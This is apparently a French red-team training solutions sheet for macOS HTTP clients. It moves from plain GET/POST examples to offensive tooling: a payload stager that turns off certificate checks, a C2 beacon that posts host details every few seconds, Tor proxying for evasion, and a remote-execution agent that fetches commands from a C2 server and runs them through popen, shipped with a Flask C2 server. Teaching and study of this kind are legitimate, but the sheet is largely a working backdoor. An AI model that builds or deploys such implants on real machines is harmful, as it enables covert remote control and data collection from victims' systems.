# SOLUTION : HTTP Client macOS

## Exercice 1 : HTTP GET avec CFNetwork

```c
// http_get_cfnetwork.c
#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>
#include <stdio.h>

void http_get(const char *url_str) {
    // Créer URL
    CFStringRef url_string = CFStringCreateWithCString(NULL, url_str, kCFStringEncodingUTF8);
    CFURLRef url = CFURLCreateWithString(NULL, url_string, NULL);

    // Créer requête
    CFHTTPMessageRef request = CFHTTPMessageCreateRequest(
        NULL,
        CFSTR("GET"),
        url,
        kCFHTTPVersion1_1
    );

    // Headers
    CFHTTPMessageSetHeaderFieldValue(request, CFSTR("User-Agent"), CFSTR("Mozilla/5.0"));

    // Créer stream
    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(NULL, request);

    // Ouvrir stream
    if (!CFReadStreamOpen(stream)) {
        printf("[-] Failed to open stream\n");
        goto cleanup;
    }

    // Lire réponse
    UInt8 buffer[4096];
    CFIndex bytes_read;

    printf("[+] Response:\n");
    while ((bytes_read = CFReadStreamRead(stream, buffer, sizeof(buffer))) > 0) {
        fwrite(buffer, 1, bytes_read, stdout);
    }

    CFReadStreamClose(stream);

cleanup:
    if (stream) CFRelease(stream);
    if (request) CFRelease(request);
    if (url) CFRelease(url);
    if (url_string) CFRelease(url_string);
}

int main() {
    http_get("http://example.com");
    return 0;
}
```

**Compilation** :
```bash
clang http_get_cfnetwork.c -o http_get_cfnetwork -framework CoreFoundation -framework CFNetwork
./http_get_cfnetwork
```

---

## Exercice 2 : HTTP POST avec curl (libcurl)

```c
// http_post_curl.c
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    fwrite(contents, 1, realsize, stdout);
    return realsize;
}

void http_post(const char *url, const char *data) {
    CURL *curl = curl_easy_init();

    if (!curl) {
        printf("[-] Failed to init curl\n");
        return;
    }

    // Configuration
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

    // Headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "User-Agent: CustomAgent/1.0");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Exécuter
    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("[-] Request failed: %s\n", curl_easy_strerror(res));
    } else {
        printf("\n[+] Request successful\n");
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

int main() {
    const char *json_data = "{\"username\":\"test\",\"password\":\"pass\"}";
    http_post("http://httpbin.org/post", json_data);
    return 0;
}
```

**Compilation** :
```bash
# Installer curl (via Homebrew)
brew install curl

# Compiler
clang http_post_curl.c -o http_post_curl -lcurl
./http_post_curl
```

---

## Exercice 3 : HTTP client avec NSURLSession (Objective-C)

```objc
// http_nsurlsession.m
#import <Foundation/Foundation.h>

void http_request(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];

    NSURLSession *session = [NSURLSession sharedSession];

    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);

    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error) {
                NSLog(@"[-] Error: %@", error.localizedDescription);
            } else {
                NSString *responseString = [[NSString alloc] initWithData:data
                    encoding:NSUTF8StringEncoding];
                NSLog(@"[+] Response:\n%@", responseString);
            }
            dispatch_semaphore_signal(semaphore);
        }];

    [task resume];
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        http_request(@"https://api.github.com/users/github");
    }
    return 0;
}
```

**Compilation** :
```bash
clang -framework Foundation http_nsurlsession.m -o http_nsurlsession
./http_nsurlsession
```

---

## Exercice 4 : Download file (RED TEAM - stage download)

```c
// download_file.c
#include <curl/curl.h>
#include <stdio.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

int download_file(const char *url, const char *output_path) {
    CURL *curl = curl_easy_init();

    if (!curl) {
        printf("[-] Failed to init curl\n");
        return 1;
    }

    FILE *fp = fopen(output_path, "wb");
    if (!fp) {
        printf("[-] Failed to open file for writing\n");
        curl_easy_cleanup(curl);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow redirects
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Disable SSL verify (RED TEAM)

    printf("[*] Downloading: %s\n", url);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("[-] Download failed: %s\n", curl_easy_strerror(res));
        fclose(fp);
        curl_easy_cleanup(curl);
        return 1;
    }

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    printf("[+] HTTP Code: %ld\n", http_code);

    fclose(fp);
    curl_easy_cleanup(curl);

    printf("[+] File saved to: %s\n", output_path);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <url> <output_file>\n", argv[0]);
        return 1;
    }

    download_file(argv[1], argv[2]);
    return 0;
}
```

**Compilation** :
```bash
clang download_file.c -o download_file -lcurl

# Test
./download_file https://example.com/payload.bin /tmp/payload.bin
```

---

## Exercice 5 : C2 beacon HTTP (simple check-in)

```c
// beacon_http.c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/utsname.h>

typedef struct {
    char *data;
    size_t size;
} memory_struct_t;

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    memory_struct_t *mem = (memory_struct_t *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) {
        printf("[-] Out of memory\n");
        return 0;
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

char *get_system_info() {
    struct utsname info;
    uname(&info);

    static char buffer[512];
    snprintf(buffer, sizeof(buffer),
             "{\"os\":\"%s\",\"hostname\":\"%s\",\"version\":\"%s\",\"arch\":\"%s\"}",
             info.sysname, info.nodename, info.release, info.machine);

    return buffer;
}

void beacon_checkin(const char *c2_url) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    memory_struct_t response = {0};

    // Préparer données
    char *system_info = get_system_info();

    // Configuration
    curl_easy_setopt(curl, CURLOPT_URL, c2_url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, system_info);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    // Headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    printf("[*] Beaconing to C2: %s\n", c2_url);

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("[+] C2 Response: %s\n", response.data);
        // Parse response for commands here
    } else {
        printf("[-] Beacon failed: %s\n", curl_easy_strerror(res));
    }

    if (response.data) free(response.data);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <c2_url>\n", argv[0]);
        printf("Example: %s http://10.0.0.1:8080/beacon\n", argv[0]);
        return 1;
    }

    const char *c2_url = argv[1];

    // Beacon loop
    while (1) {
        beacon_checkin(c2_url);
        sleep(5); // Sleep 5 seconds
    }

    return 0;
}
```

**Compilation** :
```bash
clang beacon_http.c -o beacon_http -lcurl

# Test avec serveur local
# Terminal 1: nc -lvp 8080
# Terminal 2: ./beacon_http http://127.0.0.1:8080/beacon
```

---

## Exercice 6 : HTTPS avec certificate pinning (OPSEC)

```c
// https_pinned.c
#include <curl/curl.h>
#include <stdio.h>

int main() {
    CURL *curl = curl_easy_init();

    if (!curl) {
        printf("[-] Failed to init curl\n");
        return 1;
    }

    // HTTPS avec pinning
    curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

    // Pin certificate (SHA256 fingerprint)
    // Obtenir avec: openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64
    curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY,
                     "sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=");

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("[+] Certificate pinning successful\n");
    } else {
        printf("[-] Failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    return 0;
}
```

---

## Exercice 7 : HTTP avec proxy/Tor (evasion)

```c
// http_proxy.c
#include <curl/curl.h>
#include <stdio.h>

void http_via_proxy(const char *url, const char *proxy) {
    CURL *curl = curl_easy_init();

    if (!curl) {
        printf("[-] Failed to init curl\n");
        return;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
    curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

    // Pour Tor
    // curl_easy_setopt(curl, CURLOPT_PROXY, "socks5://127.0.0.1:9050");

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("[+] Request via proxy successful\n");
    } else {
        printf("[-] Failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
}

int main() {
    // Via Tor (nécessite Tor running)
    http_via_proxy("http://check.torproject.org", "socks5://127.0.0.1:9050");

    return 0;
}
```

**Setup Tor** :
```bash
brew install tor
tor &
# Tor SOCKS proxy: 127.0.0.1:9050
```

---

## Exercice 8 : Command execution via HTTP (RED TEAM)

```c
// remote_exec.c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char *data;
    size_t size;
} response_t;

size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    response_t *mem = (response_t *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) return 0;

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

char *fetch_command(const char *c2_url) {
    CURL *curl = curl_easy_init();
    response_t response = {0};

    if (!curl) return NULL;

    curl_easy_setopt(curl, CURLOPT_URL, c2_url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK) {
        return response.data;
    } else {
        if (response.data) free(response.data);
        return NULL;
    }
}

void execute_command(const char *cmd) {
    printf("[*] Executing: %s\n", cmd);
    FILE *fp = popen(cmd, "r");

    if (!fp) {
        printf("[-] Failed to execute\n");
        return;
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);
    }

    pclose(fp);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <c2_url>\n", argv[0]);
        return 1;
    }

    while (1) {
        char *cmd = fetch_command(argv[1]);

        if (cmd && strlen(cmd) > 0) {
            // Remove trailing newline
            cmd[strcspn(cmd, "\r\n")] = 0;

            if (strcmp(cmd, "exit") == 0) {
                printf("[*] Exit command received\n");
                free(cmd);
                break;
            }

            execute_command(cmd);
            free(cmd);
        }

        sleep(3);
    }

    return 0;
}
```

**C2 Server (Python Flask)** :

```python
# c2_server.py
from flask import Flask, request

app = Flask(__name__)
commands = []

@app.route('/cmd', methods=['GET'])
def get_command():
    if commands:
        return commands.pop(0)
    return ""

@app.route('/add', methods=['POST'])
def add_command():
    cmd = request.data.decode('utf-8')
    commands.append(cmd)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

**Usage** :
```bash
# Terminal 1: Start C2
python c2_server.py

# Terminal 2: Run agent
./remote_exec http://127.0.0.1:8080/cmd

# Terminal 3: Send command
curl -X POST http://127.0.0.1:8080/add -d "whoami"
curl -X POST http://127.0.0.1:8080/add -d "uname -a"
```

---

## Resources

- [CFNetwork Programming Guide](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/CFNetwork/)
- [NSURLSession Guide](https://developer.apple.com/documentation/foundation/nsurlsession)
- [libcurl Tutorial](https://curl.se/libcurl/c/libcurl-tutorial.html)
- [C2 Infrastructure](https://www.cobaltstrike.com/blog/cobalt-strike-dns-beaconing/)
